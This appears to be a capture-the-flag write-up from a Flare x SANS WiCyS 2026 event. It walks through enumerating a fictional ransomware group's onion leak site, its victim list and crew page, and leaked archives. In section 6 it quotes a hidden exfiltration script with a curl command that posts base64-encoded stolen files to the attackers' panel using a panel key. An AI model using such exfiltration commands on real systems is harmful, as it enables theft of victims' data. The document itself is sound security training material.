# Sisterhood of the Travelling Packets

> Flare x SANS WiCyS Capture the Flag 2026

## Challenge Overview

**Event:** FLARE x SANS WiCyS Capture the Flag 2026  
**Category:** Cybersecurity / CTF  
**Focus:** Reconnaissance, web investigation, threat intelligence, API enumeration and forensic analysis  
**Status:** Completed

> ⚠️ This write-up contains spoilers and challenge solutions.
---

## Overview

This write-up documents my investigation of the **Sisterhood of the Travelling Packets** challenge from the Flare x SANS WiCyS Capture the Flag 2026.

The investigation began with a ransomware leak-style website associated with the fictional group **pantalones**.

The objective was to investigate the exposed infrastructure, identify the relationship between the leak pages and the compromised victim data, enumerate the exposed API, recover useful information from the available files and conversations, and ultimately retrieve the CTF flag.

The challenge involved a combination of:

- Web enumeration
- Hidden files and dotfiles
- API enumeration
- Parameter discovery
- Conversation enumeration
- Base64 decoding
- Credential discovery
- Authentication
- Administrative panel enumeration
- Connecting information across multiple compromised organisations

---

# 1. Initial Website Enumeration

The investigation started by accessing the exposed `.onion` website through Tor.

The landing page identified the group as:

> `pantalones`

and described the operation as:

> `stealing your files since '26.`

![Website landing page](images/Website-landing-index-page.png)

The main navigation exposed several pages:

- `index.php`
- `crew.php`
- `about.php`

I inspected each available page rather than assuming the landing page contained the entire challenge.

---

# 2. Website Content

The main leak page contained a list of victims.

![Index page content](images/index-page-content.png)

The page revealed several organisations, including:

- Sisterhood of the Travelling Packets
- NexaVista Solutions
- StratifyTech Inc.
- Lumenisys Global
- QuantumCore Systems
- AetherFlow Enterprises

The page source also contained information about leaked files and downloadable content.

---

# 3. Inspecting the About Page

The `about.php` page provided additional context about the group.

![About page](images/about-page.png)

The website claimed that pantalones was a group of four hackers:

- vex — operator / panel developer
- crypt — payload engineer
- mora — negotiations
- skid — initial access

---

# 4. Enumerating the Crew Page

The `/crew.php` page confirmed the operators and their roles.

![Crew page](images/crew-path-page.png)

This became useful later because the API conversations contained messages from these operators.

---


## 5. Inspecting the Leak Files

The website exposed downloadable leak files for some of the victims.

The **QuantumCore Systems** entry provided access to a leak archive.

![QuantumCore leak files](images/quantumcore-leak-files.png)

The **AetherFlow Enterprises** entry also exposed a leak archive.

![AetherFlow leak files](images/aetherflow-leak-files.png)

The AetherFlow archive contained:

```text
aetherflow/
├── api_keys_internal.yaml
├── customers.sql
├── route_algorithms_PROPRIETARY.sql
└── .exfil.sh
```
---
## 6. Inspecting `exfil.sh`
I inspected .exfil.sh, which contained references to the attackers' panel and showed how files were uploaded.

Relevant portions included:

PANEL="http://...onion/"
KEY="pantalonesgroup"

The script then uploaded files to the panel using:

curl -s -X POST "${PANEL}/api.php?action=upload" \
-H "X-Panel-Key: ${KEY}" \
-d "chunk=${b64}&fname=${f}&tag=aetherflow"

This confirmed the relationship between the AetherFlow exfiltration script and the attackers' command-and-control/exfiltration panel. The script encoded the file data and submitted it to the panel's upload API using the configured panel key and the aetherflow tag.

![exfil content](images/hidden-exfil-sh.png)


